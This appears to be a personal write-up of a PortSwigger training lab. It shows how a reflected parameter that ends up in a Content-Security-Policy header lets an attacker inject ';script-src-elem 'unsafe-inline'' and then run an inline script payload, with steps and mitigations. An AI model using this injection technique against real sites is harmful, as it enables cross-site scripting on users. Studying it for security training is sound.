# Lab30 - Reflected XSS Protected By CSP, Bypassed Via CSP Policy Injection

## Objective

Exploit a CSP Policy Injection vulnerability to bypass Content Security Policy and execute JavaScript.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSP Bypass |
| Difficulty | Expert |
| Impact | XSS Execution |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application dynamically builds a:

```http
Content-Security-Policy
```

header using user-controlled input.

---

# Analysis

## Initial Observation

Response header contains:

```http
Content-Security-Policy
```

---

Example:

```http
report-uri /report?token=USER_INPUT
```

---

## Key Observation

User input appears inside CSP.

---

## Problem

Inline JavaScript blocked.

---

Example:

```html
<script>alert(1)</script>
```

fails.

---

## Strategy

Modify CSP itself.

---

# Full Payload Used

## URL Parameter

```text
;script-src-elem 'unsafe-inline'
```

---

## XSS Payload

```html
<script>alert(1)</script>
```

---

# Why The Payload Works

Original CSP:

```http
script-src 'self'
```

---

Injected CSP:

```http
script-src 'self';
script-src-elem 'unsafe-inline'
```

---

Browser Processing:

```text
Policy Injection
        ↓
Inline Scripts Allowed
        ↓
XSS Executes
```

---

# Exploitation Steps

## Step 1

Locate reflected CSP parameter.

---

## Step 2

Inject:

```text
;script-src-elem 'unsafe-inline'
```

---

## Step 3

Load page with modified CSP.

---

## Step 4

Inject:

```html
<script>alert(1)</script>
```

---

## Step 5

Observe execution.

Lab solved.

---

# Personal Analysis & Testing Process

## Initial Goal

Execute JavaScript.

---

## Problem

Strict CSP blocked scripts.

---

## Key Realization

Input directly modifies:

```http
Content-Security-Policy
```

---

## Strategy

Change CSP instead of bypassing it traditionally.

---

## Result

Successfully enabled:

```http
unsafe-inline
```

and executed:

```html
<script>alert(1)</script>
```

Lab solved.

---

# Mitigation

Never place user input inside:

```http
Content-Security-Policy
```

headers.

---

Use static CSP policies.

---

Validate all header values.

---

# Related Theory

- 40-content-security-policy-csp.md
- 42-bypassing-csp-with-policy-injection.md

---

# Key Learnings

- CSP can become an attack surface.
- Security controls can fail when dynamically generated.
- Policy Injection is a powerful CSP bypass technique.